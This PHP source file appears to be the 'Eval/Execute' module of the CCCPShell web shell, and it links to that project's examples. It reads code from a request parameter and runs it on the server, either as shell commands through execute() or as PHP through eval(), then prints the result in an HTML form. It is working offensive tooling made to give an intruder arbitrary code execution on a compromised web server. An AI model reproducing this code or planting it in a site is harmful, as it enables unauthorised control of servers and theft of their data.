<?php
    /*$locale = 'en_GB.utf-8';
    setlocale(LC_ALL, $locale);
    putenv('LC_ALL='.$locale);*/

    $sBuff .= '<h2>' . tText('Eval/Execute') . '</h2>';
    $code = @trim($p['c']);
    if ($code){
        if (isset($p['e'])){
            $buf = execute($code, true);
            $sBuff .= "<br><b>" . tText('Response') . ": </b>";
            if (isset($p['dta'])) 
                $sBuff .= "<br><textarea class='bigarea' readonly>{$buf}</textarea><br>";
            else 
                $sBuff .= "<br><pre>{$buf}</pre><br>";
        } else {
            if (!preg_match('#<\?#si', $code)) 
                $code = "<?php\n\n{$code}\n\n?>";

            //hago esta chapuzada para que no se muestre el resultado arriba
            echo tText('Result of the executed code:');
            $buf = ob_get_contents();

            if ($buf){
                ob_clean();
                eval("?" . ">{$code}");
                $ret = ob_get_contents();
                $ret = convert_cyr_string($ret, 'd', 'w');
                ob_clean();
                $sBuff .= $buf;
                
                if (isset($p['dta'])) 
                    $sBuff .= '<br><textarea class="bigarea" readonly>' . hsc($ret) . '</textarea>';
                else 
                    $sBuff .= "<br><pre>{$ret}</pre>";
            } else
                eval("?" . ">{$code}");
        }
    }

    $sBuff .= '<form>
    <textarea class="bigarea" name="c">' . (isset($p['c']) ? hsc($p['c']) : '') . '</textarea></p>
    <p>' . tText('Display in text-area') . ': ' . mCheck('dta', '1', '', isset($p['dta'])) . '&nbsp;&nbsp;
    ' . tText('Execute') . ': ' . mCheck('e', '1', '', isset($p['e'])) . '&nbsp;&nbsp;
    <a href="https://github.com/xchwarze/CCCPShell/tree/master/examples" target="_blank">[ ' . tText('Get examples') . ' ]</a>
    <br><br>' . mSubmit(tText('Go!'), 'ajaxLoad(serialize(d.forms[0]))') . '</p>
    ' . mHide('me', 'execute') . '
    </form>';